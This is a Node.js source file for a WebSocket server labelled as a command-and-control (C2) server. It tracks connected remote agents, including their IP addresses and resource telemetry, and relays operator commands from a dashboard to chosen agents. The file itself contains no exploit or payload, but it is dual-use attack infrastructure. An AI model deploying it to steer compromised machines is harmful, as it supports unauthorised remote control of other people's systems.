// FILE: server.js
const express = require('express');
const { WebSocketServer } = require('ws');
const uuid = require('uuid');

const PORT = process.env.PORT || 3000;
const app = express();

app.get('/', (req, res) => res.send('OII C2 Operational'));

const server = app.listen(PORT, () => console.log(`C2 Listening on ${PORT}`));
const wss = new WebSocketServer({ server });

const agents = new Map(); 
const controllers = new Set(); 

// Heartbeat to keep connections alive on Render
const interval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, 30000);

wss.on('close', () => clearInterval(interval));

wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('pong', () => ws.isAlive = true);

  // Check query param for dashboard role
  const url = new URL(req.url, `http://${req.headers.host}`);
  const isController = url.searchParams.get('role') === 'dashboard';

  if (isController) {
    console.log('OII Dashboard Connected');
    controllers.add(ws);
    
    // Sync current agents
    const agentList = Array.from(agents.values()).map(a => a.data);
    ws.send(JSON.stringify({ type: 'FULL_SYNC', payload: agentList }));
    
    ws.on('message', (msg) => {
      try {
        const data = JSON.parse(msg);
        console.log('CMD -> Agent:', data.agent_id, data.action);
        
        if (data.action && data.agent_id && agents.has(data.agent_id)) {
          const agentWs = agents.get(data.agent_id).socket;
          if(agentWs.readyState === 1) {
             agentWs.send(JSON.stringify(data));
          } else {
             console.log("Agent socket not ready");
          }
        }
      } catch (e) { console.error(e); }
    });
    
    ws.on('close', () => controllers.delete(ws));
  } 
  else {
    // Agent Logic
    const agentIdHeader = req.headers['agent-id'];
    
    // Prevent random connection spam: Enforce Header
    if (!agentIdHeader) {
      console.log('Refusing connection: Missing agent-id header');
      ws.close();
      return;
    }

    const agentId = Array.isArray(agentIdHeader) ? agentIdHeader[0] : agentIdHeader;
    const agentIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const initialData = { 
      id: agentId, 
      ip: agentIp, 
      status: 'IDLE',
      cpuUsage: 0,
      ramUsage: 0,
      lastHeartbeat: new Date() 
    };
    
    agents.set(agentId, { socket: ws, data: initialData });
    console.log(`Agent Connected: ${agentId}`);
    
    broadcast({ type: 'AGENT_CONNECTED', payload: initialData });

    ws.on('message', (msg) => {
      try {
        const message = JSON.parse(msg);
        
        if (message.type === 'HEARTBEAT') {
           const agentRecord = agents.get(agentId);
           if (agentRecord) {
             agentRecord.data = { ...agentRecord.data, ...message.payload, lastHeartbeat: new Date() };
             broadcast({ type: 'TELEMETRY', payload: agentRecord.data });
           }
        }
        else if (message.type === 'RESPONSE') {
           console.log(`Response from ${agentId}: ${message.status}`);
           broadcast({ type: 'CMD_RESPONSE', payload: message });
        }
      } catch (e) { console.error(e); }
    });

    ws.on('close', () => {
      console.log(`Agent Disconnected: ${agentId}`);
      agents.delete(agentId);
      broadcast({ type: 'AGENT_DISCONNECTED', payload: { id: agentId } });
    });
  }
});

function broadcast(msg) {
  controllers.forEach(c => {
    if (c.readyState === 1) c.send(JSON.stringify(msg));
  });
}
